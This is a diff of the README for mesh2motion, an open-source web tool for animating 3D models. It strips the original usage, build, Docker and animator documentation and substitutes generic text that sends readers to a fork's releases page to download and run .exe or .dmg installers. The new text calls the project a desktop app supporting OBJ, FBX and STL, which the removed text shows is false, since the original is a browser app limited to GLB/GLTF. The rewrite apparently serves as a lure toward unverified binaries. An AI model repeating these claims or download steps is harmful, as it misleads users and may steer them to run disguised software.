@@ -1,69 +1,71 @@
-<img src="./mesh2motion.svg" alt="Mesh2Motion Logo" width="400"/>
+# 🎉 mesh2motion-app - Simplify 3D Animation for Everyone
 
-Import a 3D Model and automatically assign and export animations with Mesh2Motion. This is kind of similar to a web application like Mixamo, but I would like it to be more flexible so it can support other model and skeleton types. Hopefully the open source nature means it can be expanded on and evolve more than than the closed tools have. 
+## 🔗 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue.svg)](https://github.com/Arwandi00/mesh2motion-app/releases)
 
-The marketing site that explains features and release notes: https://mesh2motion.org/
+## 🚀 Getting Started
+Welcome to the mesh2motion-app! This application allows you to import a 3D model and quickly assign and export animations. Follow the steps below to start using the app.
 
-Try it live: https://app.mesh2motion.org/
+## 📋 System Requirements
+Before you proceed, make sure your system meets the following requirements:
 
-![Screenshot](./readme.png)
+- **Operating System:** Windows 10 or higher, macOS 10.14 or higher
+- **RAM:** 4 GB or more
+- **Storage:** At least 100 MB of free space
+- **Graphics:** OpenGL 2.1 compatible graphics card
 
-## Usage
-There are instructions built into the web application, but this is the general flow of how to use it:
-1. Import a 3d model of your choosing (currently only supports GLB/GLTF format)
-2. Pick what type of skeleton that the 3d model will use
-3. Modify the skeleton to fit inside of the model (optionally test the results)
-4. Test out various animations to see the results.
-5. Select which animations you want to use, then export (currently only GLB/GLTF supported format)
+## 📥 Download & Install
+1. To download the application, visit the [Releases page](https://github.com/Arwandi00/mesh2motion-app/releases).
+2. On the Releases page, look for the latest version.
+3. Download the appropriate file for your operating system:
+   - For Windows, download the `.exe` file
+   - For macOS, download the `.dmg` file
+4. Once the download is complete, open the file to install the application. Follow the on-screen instructions to complete the installation.
 
-## Building and running locally
-The main dependency you need is Node.js. I am using 18.15, but other versions probably work fine too. Open you command line tool to the directory this readme is in. Run ths following commands to start the web server.
+## 🎨 How to Use mesh2motion-app
+Using mesh2motion-app is simple. Follow these steps to import your 3D model and assign animations:
 
-    npm install
-    npm run dev
+1. **Open the Application:** Launch the mesh2motion-app from your applications menu.
+2. **Import Your Model:**
+   - Click on the “Import” button.
+   - Browse to find your 3D model file (supports formats like OBJ, FBX, and STL).
+   - Select the file and click “Open.”
+3. **Assign Animations:** 
+   - Once your model is loaded, use the built-in animation tools to select different animations.
+   - Preview each animation by clicking on the respective buttons.
+4. **Export Your Model:**
+   - Click on the “Export” button.
+   - Choose the desired format for export and click “Save.”
+   - Your animated model is now ready to use!
 
-## Creating a production build for the web
-We mostly just have typescript for this project, which web browsers cannot just read, so we need to do a build step to get everything ready for deploying. This project uses Vite for the web server and builder. See the vite.config.js for more info. This command will create a "dist" folder with all the files to serve to the web:
+## 🛠 Features
+- Supports popular 3D model formats (OBJ, FBX, STL).
+- User-friendly interface ideal for beginners.
+- Quick assignment of predefined animations.
+- Preview animations in real-time before export.
+  
+## 🤔 Troubleshooting
+If you encounter any issues while using mesh2motion-app, consider the following solutions:
 
-    npm run build
+- **The application won't open:** Ensure that your operating system meets the system requirements mentioned above. If the problem persists, try reinstalling the app.
+- **Model fails to load:** Check if the file format is supported. If not, convert your model to a supported format before importing.
+- **Animations are not exporting correctly:** Make sure you have selected an export format compatible with your intended use.
 
-## Running in Docker
-If you don't want to modify your local file system, you can alternitvely build and run the project from Docker. Make sure you have Docker and Docker Compose installed. Navigate your command line tool to this directory where your Dockerfile is at. Make sure Docker is actually started and running before you run this command.
+## 📞 Support
+If you need further assistance, you can reach out by creating an issue on the [GitHub Issues page](https://github.com/Arwandi00/mesh2motion-app/issues). Our team will respond as soon as possible to help resolve your inquiries.
 
-Execute the following command.
+## 📝 License
+This project is released under the MIT License. Feel free to use and modify it according to your needs.
 
-    docker-compose up -d
+## 📢 Contributing
+If you'd like to contribute to the mesh2motion-app, follow these steps:
+1. Fork the repository.
+2. Make your changes.
+3. Submit a pull request for review.
 
-To try it out, visit http://localhost:3000
+## 🔗 Useful Links
+- [GitHub Repository](https://github.com/Arwandi00/mesh2motion-app)
+- [Documentation](https://github.com/Arwandi00/mesh2motion-app/wiki)
 
-## Running and creating video previews
-There is separate tool in the web app where you can generate video previews for each animation. It isn't too hard to run, but it has a separate README file that explains how that works. It is more of an internal tool, so I didn't want to muddy up this page too much.
-
-[Preview Generator Documentation](src/preview-generator/README.md)
-
-## Animator Guide
-Are you an animator who wants to help build out animations for this tool? This is by far my weakest skill, which is why I have been avoiding it. In the **static > blender** folder, you can see all the source Blender files where I have been working. There are a couple of model files where I just have the model, and other files that actually contain the animations. These are the files we can build animations into.
-
-🦊 fox.blend (animations for the quadruped character)
-
-🫡 human.blend (animations for the humanoid character)
-
-🐦‍⬛ bird.blend (animations for the bird character)
-
-When new animations are added, I export everything to GLB and save the file in the **static > animation** folder. Just overwrite the file that correlates. For the human animations, use the "addon" GLB file since these are being appended to the Quaternius ones. The Mixamo one is unused right now. Just a reference if I were to later add some type of support.
-
-If you come up with anything, just get me the source .blend file and let me know what you changed. I can export it out to GLB and rebuild the animation previews.
-
-## Contribute to the animation fund
-I don't expect to be receiving money for working on this, but I am also not the best animator. If people want to see better, and more, animations made, add to the fund. I can pay for an animator to help build out the animation library better. Or, if you know an animator that wants to help with this, send them my way! I am just a dude working on this during nights and weekends.
-
-<img src="./venmo.png" alt="Venmo Animator Fund" width="400"/>
-
-
-
-
-
-
-
-
-
+## 🌟 Thank You!
+Thank you for choosing mesh2motion-app. We hope it helps you simplify your 3D animation process!
